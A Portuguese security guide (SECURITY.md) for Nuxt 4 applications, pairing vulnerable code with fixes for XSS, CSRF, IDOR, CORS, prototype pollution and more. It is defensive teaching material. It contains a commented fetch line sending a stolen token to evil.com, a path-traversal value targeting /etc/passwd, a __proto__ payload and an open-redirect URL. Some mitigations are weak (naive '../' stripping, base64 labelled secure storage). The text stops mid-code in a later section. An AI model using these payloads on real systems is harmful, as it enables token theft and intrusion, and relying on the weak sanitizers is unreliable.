# SECURITY.md

Guia completo de segurança para aplicações Nuxt 4. Cobre as 20 vulnerabilidades mais críticas em aplicações front-end.

## Índice

1. [Módulos de Segurança](#módulos-de-segurança)
2. [Headers de Segurança](#headers-de-segurança)
3. [XSS - Cross-Site Scripting](#xss---cross-site-scripting)
4. [Clickjacking](#clickjacking)
5. [CSRF - Cross-Site Request Forgery](#csrf---cross-site-request-forgery)
6. [IDOR - Insecure Direct Object References](#idor---insecure-direct-object-references)
7. [Exposição de Segredos](#exposição-de-segredos)
8. [CSP - Content Security Policy](#csp---content-security-policy)
9. [SRI - Subresource Integrity](#sri---subresource-integrity)
10. [Open Redirect](#open-redirect)
11. [window.postMessage Inseguro](#windowpostmessage-inseguro)
12. [Prototype Pollution](#prototype-pollution)
13. [DNS Rebinding](#dns-rebinding)
14. [Magecart / Formjacking](#magecart--formjacking)
15. [Supply Chain Attack](#supply-chain-attack)
16. [Web Storage XSS](#web-storage-xss)
17. [Service Worker Hijacking](#service-worker-hijacking)
18. [CORS Mal Configurado](#cors-mal-configurado)
19. [Insecure Deserialization](#insecure-deserialization)
20. [Client-Side Path Traversal](#client-side-path-traversal)
21. [WebSocket Hijacking](#websocket-hijacking)
22. [Client-Side Validation Trust](#client-side-validation-trust)
23. [Autenticação e Tokens](#autenticação-e-tokens)
24. [Rate Limiting](#rate-limiting)
25. [Checklist de Segurança](#checklist-de-segurança)

---

## Módulos de Segurança

### Instalação Recomendada

```bash
# Módulo principal de segurança (headers, CSP, XSS, CORS)
npx nuxi@latest module add security

# Proteção CSRF
npx nuxi@latest module add csurf
```

### Configuração Básica

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  modules: [
    'nuxt-security',
    'nuxt-csurf'
  ],

  security: {
    headers: {
      contentSecurityPolicy: {
        'default-src': ["'self'"],
        'script-src': ["'self'", "'strict-dynamic'"],
        'style-src': ["'self'", "'unsafe-inline'"],
        'img-src': ["'self'", 'data:', 'https:'],
        'font-src': ["'self'"],
        'connect-src': ["'self'"],
        'frame-ancestors': ["'none'"],
        'base-uri': ["'self'"],
        'form-action': ["'self'"]
      },
      crossOriginEmbedderPolicy: 'require-corp',
      crossOriginOpenerPolicy: 'same-origin',
      crossOriginResourcePolicy: 'same-origin',
      originAgentCluster: '?1',
      referrerPolicy: 'strict-origin-when-cross-origin',
      strictTransportSecurity: {
        maxAge: 31536000,
        includeSubdomains: true,
        preload: true
      },
      xContentTypeOptions: 'nosniff',
      xDNSPrefetchControl: 'off',
      xDownloadOptions: 'noopen',
      xFrameOptions: 'DENY',
      xPermittedCrossDomainPolicies: 'none',
      xXSSProtection: '1; mode=block'
    },
    xssValidator: true,
    rateLimiter: {
      tokensPerInterval: 150,
      interval: 300000
    },
    requestSizeLimiter: {
      maxRequestSizeInBytes: 2000000,
      maxUploadFileRequestInBytes: 8000000
    }
  },

  csurf: {
    https: true,
    cookieKey: 'csrf',
    methodsToProtect: ['POST', 'PUT', 'PATCH', 'DELETE']
  }
})
```

---

## Headers de Segurança

### Headers Essenciais

| Header | Valor | Proteção |
|--------|-------|----------|
| `X-Content-Type-Options` | `nosniff` | MIME sniffing |
| `X-Frame-Options` | `DENY` | Clickjacking |
| `X-XSS-Protection` | `1; mode=block` | XSS básico (legado) |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | Force HTTPS |
| `Content-Security-Policy` | Customizado | XSS, injection |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Vazamento de dados |
| `Permissions-Policy` | `camera=(), microphone=()` | Acesso a recursos |

### Configuração por Rota

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  routeRules: {
    '/api/**': {
      security: {
        headers: {
          contentSecurityPolicy: false
        }
      }
    },
    '/admin/**': {
      security: {
        rateLimiter: {
          tokensPerInterval: 50,
          interval: 300000
        }
      }
    }
  }
})
```

---

## XSS - Cross-Site Scripting

### O que é?

Cross-Site Scripting permite que atacantes injetem scripts maliciosos em páginas web vistas por outros usuários.

### Tipos de XSS

| Tipo | Descrição | Vetor de Ataque |
|------|-----------|-----------------|
| **Stored** | Script salvo no banco | Comentários, perfis, posts |
| **Reflected** | Script na URL | Links maliciosos, query params |
| **DOM-based** | Manipulação do DOM no cliente | innerHTML, document.write |

### Prevenção

#### 1. Nunca usar v-html com dados do usuário

```vue
<!-- ❌ PERIGOSO - XSS via dados do usuário -->
<div v-html="userComment"></div>

<!-- ✅ SEGURO - Vue escapa automaticamente -->
<div>{{ userComment }}</div>
```

#### 2. Sanitizar HTML quando necessário

```typescript
// app/lib/sanitize.ts
import DOMPurify from 'dompurify'

export function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'li'],
    ALLOWED_ATTR: ['class']
  })
}

// Uso
const safeHtml = sanitizeHtml(userInput)
```

#### 3. Escapar em contextos específicos

```typescript
// app/lib/escape.ts

// Para inserção em HTML
export function escapeHtml(str: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  }
  return str.replace(/[&<>"']/g, c => map[c])
}

// Para inserção em URLs
export function escapeUrl(str: string): string {
  return encodeURIComponent(str)
}

// Para inserção em JavaScript
export function escapeJs(str: string): string {
  return JSON.stringify(str).slice(1, -1)
}
```

#### 4. Validar no servidor

```typescript
// server/api/comments.post.ts
import { z } from 'zod'

const commentSchema = z.object({
  content: z.string()
    .min(1)
    .max(1000)
    .refine(val => !/<script/i.test(val), 'Scripts não permitidos')
    .refine(val => !/on\w+\s*=/i.test(val), 'Event handlers não permitidos')
})

export default defineEventHandler(async (event) => {
  const body = await readBody(event)
  const result = commentSchema.safeParse(body)

  if (!result.success) {
    throw createError({ statusCode: 400, message: 'Dados inválidos' })
  }

  // Processar dados seguros...
})
```

---

## Clickjacking

### O que é?

Atacante sobrepõe uma página invisível sobre conteúdo legítimo, fazendo o usuário clicar em algo diferente do que vê.

### Prevenção

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  security: {
    headers: {
      // Impede que a página seja carregada em iframe
      xFrameOptions: 'DENY',

      // CSP também protege
      contentSecurityPolicy: {
        'frame-ancestors': ["'none'"]
      }
    }
  }
})
```

### Proteção Adicional via JavaScript

```typescript
// app/plugins/framebusting.client.ts
export default defineNuxtPlugin(() => {
  // Proteção contra frames
  if (window.self !== window.top) {
    // Estamos em um iframe - redirecionar para o top
    window.top?.location.replace(window.self.location.href)
  }
})
```

---

## CSRF - Cross-Site Request Forgery

### O que é?

Força o usuário autenticado a executar ações indesejadas em uma aplicação onde está logado.

### Implementação com nuxt-csurf

#### 1. Configurar módulo

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  modules: ['nuxt-csurf'],
  csurf: {
    https: process.env.NODE_ENV === 'production',
    cookie: {
      path: '/',
      httpOnly: true,
      sameSite: 'strict'
    },
    methodsToProtect: ['POST', 'PUT', 'PATCH', 'DELETE']
  }
})
```

#### 2. Usar em formulários

```vue
<script setup>
// useCsrfFetch adiciona o token automaticamente
const { data, error } = await useCsrfFetch('/api/users', {
  method: 'POST',
  body: { name: 'João' }
})
</script>
```

#### 3. Usar com $fetch manual

```typescript
const { csrf } = useCsrf()

await $fetch('/api/users', {
  method: 'POST',
  headers: { 'csrf-token': csrf },
  body: { name: 'João' }
})
```

### SameSite Cookie

```typescript
// server/api/auth/login.post.ts
setCookie(event, 'session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict', // Impede envio em requisições cross-site
  maxAge: 60 * 60 * 24
})
```

---

## IDOR - Insecure Direct Object References

### O que é?

Usuário acessa recursos de outros usuários manipulando IDs na URL ou requisições.

### Exemplo Vulnerável

```typescript
// ❌ VULNERÁVEL - Não verifica ownership
// GET /api/orders/123
export default defineEventHandler(async (event) => {
  const id = getRouterParam(event, 'id')
  const order = await db.orders.findById(id)
  return order // Qualquer um pode ver qualquer pedido!
})
```

### Prevenção

```typescript
// ✅ SEGURO - Verifica ownership
// server/api/orders/[id].get.ts
export default defineEventHandler(async (event) => {
  const id = getRouterParam(event, 'id')
  const userId = event.context.user?.id

  if (!userId) {
    throw createError({ statusCode: 401 })
  }

  const order = await db.orders.findFirst({
    where: {
      id,
      userId // Só retorna se pertence ao usuário
    }
  })

  if (!order) {
    throw createError({ statusCode: 404 })
  }

  return order
})
```

### Padrões de Proteção

```typescript
// server/utils/authorization.ts

// Verificar ownership genérico
export async function verifyOwnership<T extends { userId: string }>(
  resource: T | null,
  userId: string
): Promise<T> {
  if (!resource) {
    throw createError({ statusCode: 404, message: 'Recurso não encontrado' })
  }

  if (resource.userId !== userId) {
    throw createError({ statusCode: 403, message: 'Acesso negado' })
  }

  return resource
}

// Uso
const order = await db.orders.findById(id)
const verified = await verifyOwnership(order, event.context.user.id)
```

### UUIDs vs IDs Sequenciais

```typescript
// ❌ IDs sequenciais são previsíveis
// /api/users/1, /api/users/2, /api/users/3

// ✅ UUIDs são imprevisíveis (mas ainda precisam de verificação!)
// /api/users/550e8400-e29b-41d4-a716-446655440000

import { randomUUID } from 'crypto'
const id = randomUUID()
```

---

## Exposição de Segredos

### O que é?

API keys, tokens e credenciais expostos no código client-side.

### Onde Segredos Vazam

| Local | Risco | Exemplo |
|-------|-------|---------|
| Source code | Alto | `const apiKey = 'sk-...'` |
| Bundle JS | Alto | Webpack bundle com secrets |
| Git history | Alto | .env commitado |
| Network tab | Médio | Headers com tokens |
| localStorage | Alto | Tokens acessíveis via XSS |

### Prevenção

#### 1. RuntimeConfig correto

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  runtimeConfig: {
    // ✅ PRIVADO - Só acessível no servidor
    jwtSecret: process.env.JWT_SECRET,
    stripeSecretKey: process.env.STRIPE_SECRET_KEY,
    dbUrl: process.env.DATABASE_URL,

    // ⚠️ PÚBLICO - Exposto ao cliente (só dados não sensíveis!)
    public: {
      apiBaseUrl: process.env.API_BASE_URL,
      stripePublicKey: process.env.STRIPE_PUBLIC_KEY // pk_... é público
    }
  }
})
```

#### 2. Verificar no código

```typescript
// ❌ ERRADO - Acessa secret no cliente
const config = useRuntimeConfig()
console.log(config.jwtSecret) // undefined no cliente, mas perigoso

// ✅ CORRETO - Usar apenas no servidor
// server/api/protected.ts
export default defineEventHandler((event) => {
  const config = useRuntimeConfig()
  const secret = config.jwtSecret // Disponível apenas aqui
})
```

#### 3. .gitignore rigoroso

```gitignore
# .gitignore
.env
.env.*
!.env.example
*.pem
*.key
credentials.json
```

#### 4. Auditoria de vazamentos

```bash
# Verificar se há secrets no código
npx secretlint "**/*"

# Ou manualmente
grep -r "sk-\|secret\|password\|apikey" --include="*.ts" --include="*.vue"
```

---

## CSP - Content Security Policy

### O que é?

Header que controla quais recursos podem ser carregados na página.

### Configuração Robusta

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  security: {
    headers: {
      contentSecurityPolicy: {
        // Padrão: só do próprio domínio
        'default-src': ["'self'"],

        // Scripts: próprio domínio + nonce para inline
        'script-src': ["'self'", "'strict-dynamic'"],

        // Estilos: próprio domínio (evitar unsafe-inline se possível)
        'style-src': ["'self'", "'unsafe-inline'"],

        // Imagens: próprio domínio + data URIs + HTTPS externo
        'img-src': ["'self'", 'data:', 'https:'],

        // Fontes: próprio domínio + Google Fonts
        'font-src': ["'self'", 'https://fonts.gstatic.com'],

        // Conexões: próprio domínio + API
        'connect-src': ["'self'", 'https://api.exemplo.com'],

        // Frames: nenhum
        'frame-src': ["'none'"],

        // Objetos (Flash, etc): nenhum
        'object-src': ["'none'"],

        // Base URI: próprio domínio
        'base-uri': ["'self'"],

        // Form actions: próprio domínio
        'form-action': ["'self'"],

        // Frame ancestors: nenhum (anti-clickjacking)
        'frame-ancestors': ["'none'"],

        // Upgrade requests HTTP para HTTPS
        'upgrade-insecure-requests': true
      }
    }
  }
})
```

### CSP Report-Only (para testes)

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  security: {
    headers: {
      contentSecurityPolicy: {
        // ... suas regras
      },
      // Modo report-only para testes
      contentSecurityPolicyReportOnly: {
        'default-src': ["'self'"],
        'report-uri': ['/api/csp-report']
      }
    }
  }
})

// server/api/csp-report.post.ts
export default defineEventHandler(async (event) => {
  const report = await readBody(event)
  console.warn('CSP Violation:', report)
  // Salvar em log ou serviço de monitoramento
})
```

---

## SRI - Subresource Integrity

### O que é?

Garante que recursos externos (CDN) não foram modificados, verificando hash do conteúdo.

### Implementação

```html
<!-- ✅ Com SRI -->
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>

<link
  rel="stylesheet"
  href="https://cdn.example.com/style.css"
  integrity="sha384-..."
  crossorigin="anonymous">
```

### Gerar Hash SRI

```bash
# Gerar hash de arquivo local
cat arquivo.js | openssl dgst -sha384 -binary | openssl base64 -A

# Ou usar ferramenta online
# https://www.srihash.org/
```

### Configuração no Nuxt

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  app: {
    head: {
      script: [
        {
          src: 'https://cdn.example.com/analytics.js',
          integrity: 'sha384-...',
          crossorigin: 'anonymous'
        }
      ],
      link: [
        {
          rel: 'stylesheet',
          href: 'https://cdn.example.com/theme.css',
          integrity: 'sha384-...',
          crossorigin: 'anonymous'
        }
      ]
    }
  }
})
```

### Plugin para SRI Automático

```typescript
// Se usar Vite plugin para SRI
// vite-plugin-sri

// vite.config.ts (dentro de nuxt.config.ts)
export default defineNuxtConfig({
  vite: {
    plugins: [
      // Plugins que adicionam SRI automaticamente aos builds
    ]
  }
})
```

---

## Open Redirect

### O que é?

Aplicação redireciona usuário para URL controlada pelo atacante.

### Exemplo Vulnerável

```typescript
// ❌ VULNERÁVEL
// /api/redirect?url=https://evil.com
export default defineEventHandler((event) => {
  const url = getQuery(event).url as string
  return sendRedirect(event, url) // Redireciona para qualquer lugar!
})
```

```vue
<!-- ❌ VULNERÁVEL no cliente -->
<script setup>
const route = useRoute()
const redirect = route.query.redirect as string

onMounted(() => {
  if (redirect) {
    navigateTo(redirect) // Perigoso!
  }
})
</script>
```

### Prevenção

```typescript
// server/utils/redirect.ts

const ALLOWED_HOSTS = [
  'meusite.com',
  'app.meusite.com'
]

export function safeRedirect(url: string, fallback = '/'): string {
  try {
    const parsed = new URL(url, 'https://meusite.com')

    // Só permite URLs do próprio domínio ou lista permitida
    if (ALLOWED_HOSTS.includes(parsed.hostname)) {
      return parsed.href
    }

    // URLs relativas são seguras
    if (url.startsWith('/') && !url.startsWith('//')) {
      return url
    }
  } catch {
    // URL inválida
  }

  return fallback
}

// Uso
// server/api/redirect.get.ts
export default defineEventHandler((event) => {
  const url = getQuery(event).url as string
  const safeUrl = safeRedirect(url, '/')
  return sendRedirect(event, safeUrl)
})
```

```typescript
// app/composables/useSafeRedirect.ts
export function useSafeRedirect() {
  const ALLOWED_PATHS = ['/dashboard', '/profile', '/settings']

  function redirect(path: string) {
    // Só permite caminhos conhecidos ou relativos simples
    if (ALLOWED_PATHS.includes(path) || /^\/[\w-]+$/.test(path)) {
      navigateTo(path)
    } else {
      navigateTo('/')
    }
  }

  return { redirect }
}
```

---

## window.postMessage Inseguro

### O que é?

API para comunicação entre janelas/iframes que pode ser explorada se não validar origem.

### Exemplo Vulnerável

```typescript
// ❌ VULNERÁVEL - Não verifica origem
window.addEventListener('message', (event) => {
  // Qualquer site pode enviar mensagens!
  const data = event.data
  if (data.type === 'UPDATE_USER') {
    updateUser(data.payload) // Perigoso!
  }
})
```

### Prevenção

```typescript
// app/composables/useSecurePostMessage.ts
export function useSecurePostMessage() {
  const ALLOWED_ORIGINS = [
    'https://meusite.com',
    'https://app.meusite.com'
  ]

  function listen(callback: (data: unknown) => void) {
    const handler = (event: MessageEvent) => {
      // ✅ Sempre verificar origem
      if (!ALLOWED_ORIGINS.includes(event.origin)) {
        console.warn('Mensagem de origem não confiável:', event.origin)
        return
      }

      // ✅ Validar estrutura da mensagem
      if (typeof event.data !== 'object' || !event.data.type) {
        return
      }

      callback(event.data)
    }

    window.addEventListener('message', handler)

    onUnmounted(() => {
      window.removeEventListener('message', handler)
    })
  }

  function send(targetWindow: Window, message: unknown, targetOrigin: string) {
    // ✅ Sempre especificar origem de destino
    if (ALLOWED_ORIGINS.includes(targetOrigin)) {
      targetWindow.postMessage(message, targetOrigin)
    }
  }

  return { listen, send }
}
```

```typescript
// Uso seguro
const { listen, send } = useSecurePostMessage()

listen((data) => {
  if (data.type === 'USER_UPDATED') {
    // Processar apenas mensagens esperadas
    refreshUser()
  }
})
```

---

## Prototype Pollution

### O que é?

Atacante modifica o prototype de objetos JavaScript, afetando toda a aplicação.

### Exemplo Vulnerável

```typescript
// ❌ VULNERÁVEL - merge recursivo inseguro
function deepMerge(target: any, source: any) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = deepMerge(target[key] || {}, source[key])
    } else {
      target[key] = source[key]
    }
  }
  return target
}

// Atacante envia:
// { "__proto__": { "isAdmin": true } }
deepMerge({}, userInput)

// Agora TODOS os objetos têm isAdmin = true
console.log({}.isAdmin) // true!
```

### Prevenção

```typescript
// app/lib/safeMerge.ts

// ✅ SEGURO - Bloqueia keys perigosas
const FORBIDDEN_KEYS = ['__proto__', 'constructor', 'prototype']

export function safeMerge<T extends object>(target: T, source: unknown): T {
  if (!source || typeof source !== 'object') {
    return target
  }

  const result = { ...target }

  for (const key of Object.keys(source as object)) {
    // Bloquear prototype pollution
    if (FORBIDDEN_KEYS.includes(key)) {
      continue
    }

    // Verificar se é propriedade própria
    if (!Object.prototype.hasOwnProperty.call(source, key)) {
      continue
    }

    const value = (source as Record<string, unknown>)[key]

    if (typeof value === 'object' && value !== null && !Array.isArray(value)) {
      (result as Record<string, unknown>)[key] = safeMerge(
        (result as Record<string, unknown>)[key] as object || {},
        value
      )
    } else {
      (result as Record<string, unknown>)[key] = value
    }
  }

  return result
}
```

```typescript
// ✅ Usar Object.create(null) para objetos sem prototype
const safeObject = Object.create(null)
safeObject.key = 'value'
// safeObject não tem __proto__
```

```typescript
// ✅ Usar Map para dados do usuário
const userPrefs = new Map<string, unknown>()
userPrefs.set('theme', 'dark')
// Map não é afetado por prototype pollution
```

---

## DNS Rebinding

### O que é?

Atacante faz seu domínio resolver para localhost/rede interna após validação inicial.

### Prevenção

```typescript
// server/middleware/hostValidation.ts
const ALLOWED_HOSTS = [
  'meusite.com',
  'www.meusite.com',
  'localhost:3000' // Apenas em dev
]

export default defineEventHandler((event) => {
  const host = getHeader(event, 'host')

  if (!host || !ALLOWED_HOSTS.includes(host)) {
    throw createError({
      statusCode: 403,
      message: 'Host não permitido'
    })
  }
})
```

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  // Em produção, definir hosts permitidos
  devServer: {
    host: 'localhost' // Não usar 0.0.0.0 em dev
  },

  security: {
    headers: {
      // Reforçar com CSP
      contentSecurityPolicy: {
        'connect-src': ["'self'"] // Só conecta ao próprio domínio
      }
    }
  }
})
```

---

## Magecart / Formjacking

### O que é?

Atacante injeta scripts para roubar dados de cartão de crédito em páginas de checkout.

### Prevenção

#### 1. CSP Restrito para Checkout

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  routeRules: {
    '/checkout/**': {
      security: {
        headers: {
          contentSecurityPolicy: {
            'default-src': ["'self'"],
            'script-src': ["'self'"], // Nenhum script externo!
            'style-src': ["'self'"],
            'connect-src': ["'self'", 'https://api.stripe.com'],
            'frame-src': ['https://js.stripe.com'] // Apenas Stripe
          }
        }
      }
    }
  }
})
```

#### 2. Usar iframes para pagamento

```vue
<!-- ✅ Use Stripe Elements ou similar em iframe -->
<template>
  <div id="card-element">
    <!-- Stripe monta o input aqui em iframe seguro -->
  </div>
</template>

<script setup>
// O cartão nunca toca seu JavaScript
const stripe = await loadStripe('pk_...')
const elements = stripe.elements()
const cardElement = elements.create('card')
cardElement.mount('#card-element')
</script>
```

#### 3. Monitorar alterações no DOM

```typescript
// app/plugins/domMonitor.client.ts
export default defineNuxtPlugin(() => {
  if (process.env.NODE_ENV === 'production') {
    // Observar mudanças suspeitas no DOM
    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        for (const node of mutation.addedNodes) {
          if (node instanceof HTMLScriptElement) {
            // Script adicionado dinamicamente - alertar!
            console.error('Script suspeito detectado:', node.src)
            // Enviar para monitoramento
          }
        }
      }
    })

    observer.observe(document.body, {
      childList: true,
      subtree: true
    })
  }
})
```

---

## Supply Chain Attack

### O que é?

Pacote npm malicioso ou comprometido injeta código na sua aplicação.

### Prevenção

#### 1. Auditar dependências

```bash
# Verificar vulnerabilidades conhecidas
npm audit

# Corrigir automaticamente
npm audit fix

# Ver detalhes de um pacote
npm info <pacote>
```

#### 2. Lockfile

```bash
# SEMPRE commitar o lockfile
git add package-lock.json

# Instalar com versões exatas
npm ci # Em vez de npm install em CI/CD
```

#### 3. Verificar pacotes antes de instalar

```bash
# Ver downloads e manutenção
npm info <pacote>

# Verificar no bundlephobia
# https://bundlephobia.com/

# Verificar no snyk
# https://snyk.io/advisor/
```

#### 4. Renovate/Dependabot

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

#### 5. Verificar scripts de pacotes

```json
// package.json
{
  "scripts": {
    // ⚠️ Cuidado com scripts que rodam automaticamente
    "preinstall": "...", // Roda antes de npm install
    "postinstall": "..."  // Roda depois de npm install
  }
}
```

```bash
# Ignorar scripts de pacotes
npm install --ignore-scripts

# Ou configurar globalmente
npm config set ignore-scripts true
```

---

## Web Storage XSS

### O que é?

localStorage e sessionStorage são acessíveis via JavaScript, vulneráveis a XSS.

### Problema

```typescript
// ❌ PERIGOSO - Token acessível via XSS
localStorage.setItem('token', 'jwt-token-aqui')

// Se houver XSS, atacante pode fazer:
// fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
```

### Prevenção

#### 1. Não armazenar dados sensíveis

```typescript
// ❌ ERRADO
localStorage.setItem('authToken', token)
localStorage.setItem('creditCard', cardNumber)

// ✅ CORRETO - Usar cookies httpOnly
// O token fica no cookie, não acessível via JS
```

#### 2. Se precisar usar localStorage

```typescript
// app/lib/secureStorage.ts

// Criptografar dados sensíveis (não é 100% seguro, mas dificulta)
export function setSecure(key: string, value: string) {
  // Usar para dados não-críticos apenas
  const encoded = btoa(encodeURIComponent(value))
  localStorage.setItem(key, encoded)
}

export function getSecure(key: string): string | null {
  const encoded = localStorage.getItem(key)
  if (!encoded) return null
  try {
    return decodeURIComponent(atob(encoded))
  } catch {
    return null
  }
}

// Limpar ao sair
export function clearSecure() {
  localStorage.clear()
  sessionStorage.clear()
}
```

#### 3. Dados que podem ir no localStorage

```typescript
// ✅ OK para localStorage (não sensíveis)
localStorage.setItem('theme', 'dark')
localStorage.setItem('language', 'pt-BR')
localStorage.setItem('sidebar-collapsed', 'true')

// ❌ NUNCA em localStorage
// - Tokens de autenticação
// - Dados pessoais (CPF, cartão)
// - Senhas
// - Session IDs
```

---

## Service Worker Hijacking

### O que é?

Service Worker malicioso intercepta todas as requisições da aplicação.

### Prevenção

#### 1. CSP para Service Workers

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  security: {
    headers: {
      contentSecurityPolicy: {
        // Restringir de onde SWs podem ser carregados
        'worker-src': ["'self'"]
      }
    }
  }
})
```

#### 2. Escopo restrito

```typescript
// Registrar SW com escopo limitado
navigator.serviceWorker.register('/sw.js', {
  scope: '/app/' // Só intercepta /app/*
})
```

#### 3. Verificar integridade

```typescript
// app/plugins/swIntegrity.client.ts
export default defineNuxtPlugin(async () => {
  if ('serviceWorker' in navigator) {
    const registrations = await navigator.serviceWorker.getRegistrations()

    for (const registration of registrations) {
      // Verificar se o SW é do domínio esperado
      if (!registration.scope.startsWith(window.location.origin)) {
        console.error('Service Worker suspeito detectado')
        await registration.unregister()
      }
    }
  }
})
```

---

## CORS Mal Configurado

### O que é?

CORS muito permissivo expõe APIs internas a sites maliciosos.

### Configuração Errada

```typescript
// ❌ PERIGOSO - Permite qualquer origem
headers: {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Credentials': 'true' // Isso nem funciona com *
}
```

### Configuração Correta

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  routeRules: {
    '/api/**': {
      security: {
        corsHandler: {
          // Lista explícita de origens
          origin: [
            'https://meusite.com',
            'https://app.meusite.com'
          ],
          methods: ['GET', 'POST', 'PUT', 'DELETE'],
          credentials: true,
          allowHeaders: ['Content-Type', 'Authorization'],
          exposeHeaders: ['X-Custom-Header'],
          maxAge: 86400
        }
      }
    }
  }
})
```

### CORS Dinâmico Seguro

```typescript
// server/middleware/cors.ts
const ALLOWED_ORIGINS = new Set([
  'https://meusite.com',
  'https://app.meusite.com',
  ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : [])
])

export default defineEventHandler((event) => {
  const origin = getHeader(event, 'origin')

  if (origin && ALLOWED_ORIGINS.has(origin)) {
    setHeader(event, 'Access-Control-Allow-Origin', origin)
    setHeader(event, 'Access-Control-Allow-Credentials', 'true')
    setHeader(event, 'Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE')
    setHeader(event, 'Access-Control-Allow-Headers', 'Content-Type, Authorization')
  }

  // Preflight
  if (event.method === 'OPTIONS') {
    setHeader(event, 'Access-Control-Max-Age', '86400')
    return null
  }
})
```

---

## Insecure Deserialization

### O que é?

`JSON.parse()` ou outras funções de parse executam código malicioso.

### Problema

```typescript
// ❌ PERIGOSO com dados do usuário
const data = JSON.parse(userInput)

// JSON.parse é seguro por si só, MAS:
// 1. O objeto resultante pode ter __proto__ malicioso
// 2. Dados podem ser usados de forma insegura depois
```

### Prevenção

```typescript
// server/utils/safeParse.ts
import { z } from 'zod'

// ✅ Parse + validação com schema
export function safeParse<T>(
  input: string,
  schema: z.ZodType<T>
): T | null {
  try {
    const parsed = JSON.parse(input)
    const result = schema.safeParse(parsed)
    return result.success ? result.data : null
  } catch {
    return null
  }
}

// Uso
const userSchema = z.object({
  name: z.string().max(100),
  age: z.number().int().positive()
})

const user = safeParse(userInput, userSchema)
if (!user) {
  throw createError({ statusCode: 400 })
}
```

```typescript
// ✅ Usar reviver para filtrar
function safeJsonParse(json: string) {
  return JSON.parse(json, (key, value) => {
    // Bloquear keys perigosas
    if (key === '__proto__' || key === 'constructor') {
      return undefined
    }
    return value
  })
}
```

---

## Client-Side Path Traversal

### O que é?

Router permite navegação para paths não autorizados via `../` ou manipulação de URL.

### Exemplo Vulnerável

```typescript
// ❌ VULNERÁVEL
const route = useRoute()
const file = route.params.file

// Se file = "../../../etc/passwd"
const content = await $fetch(`/api/files/${file}`)
```

### Prevenção

```typescript
// app/composables/useSafePath.ts
export function useSafePath() {
  function sanitize(path: string): string {
    return path
      // Remover ../
      .replace(/\.\.\//g, '')
      // Remover ./
      .replace(/\.\//g, '')
      // Remover //
      .replace(/\/\//g, '/')
      // Remover caracteres perigosos
      .replace(/[<>:"|?*]/g, '')
  }

  function isValidPath(path: string): boolean {
    // Não permite ..
    if (path.includes('..')) return false
    // Não permite paths absolutos
    if (path.startsWith('/')) return false
    // Só alfanumérico, -, _, /
    return /^[\w\-\/]+$/.test(path)
  }

  return { sanitize, isValidPath }
}
```

```typescript
// server/api/files/[...path].get.ts
export default defineEventHandler((event) => {
  const path = getRouterParam(event, 'path')

  // Validar path
  if (!path || path.includes('..') || path.startsWith('/')) {
    throw createError({ statusCode: 400, message: 'Path inválido' })
  }

  // Resolver e verificar se está dentro do diretório permitido
  const basePath = '/app/uploads'
  const fullPath = resolve(basePath, path)

  if (!fullPath.startsWith(basePath)) {
    throw createError({ statusCode: 403, message: 'Acesso negado' })
  }

  // Agora é seguro acessar o arquivo
})
```

---

## WebSocket Hijacking

### O que é?

Conexões WebSocket não verificam origem, permitindo que sites maliciosos se conectem.

### Prevenção

```typescript
// server/api/ws.ts
import { defineWebSocketHandler } from 'h3'

export default defineWebSocketHandler({
  open(peer) {
    // Verificar origem
    const origin = peer.request?.headers.get('origin')
    const allowedOrigins = ['https://meusite.com']

    if (!origin || !allowedOrigins.includes(origin)) {
      peer.close(1008, 'Origin não permitida')
      return
    }

    // Verificar autenticação
    const token = peer.request?.headers.get('authorization')
    if (!verifyToken(token)) {
      peer.close(1008, 'Não autorizado')
      return
    }
  },

  message(peer, message) {
    // Validar mensagens recebidas
    try {
      const data = JSON.parse(message.text())
      if (!isValidMessage(data)) {
        return
      }
      // Processar mensagem segura
    } catch {
      // Ignorar mensagens inválidas
    }
  }
})
```

```typescript
// app/composables/useSecureWebSocket.ts
export function useSecureWebSocket(url: string) {
  const ws = ref<WebSocket | null>(null)
  const isConnected = ref(false)

  function connect(token: string) {
    // Usar wss:// (WebSocket Secure)
    const secureUrl = url.replace('ws://', 'wss://')

    ws.value = new WebSocket(secureUrl, ['bearer', token])

    ws.value.onopen = () => {
      isConnected.value = true
    }

    ws.value.onmessage = (event) => {
      // Validar mensagem antes de processar
      try {
        const data = JSON.parse(event.data)
        // Processar apenas mensagens esperadas
      } catch {
        console.warn('Mensagem WebSocket inválida')
      }
    }

    ws.value.onerror = () => {
      isConnected.value = false
    }
  }

  function disconnect() {
    ws.value?.close()
    ws.value = null
    isConnected.value = false
  }

  onUnmounted(disconnect)

  return { connect, disconnect, isConnected }
}
```

---

## Client-Side Validation Trust

### O que é?

Confiar apenas em validação do cliente, que pode ser facilmente contornada.

### Problema

```typescript
// ❌ Apenas validação no cliente
const isValid = form.value.email.includes('@')
if (isValid) {
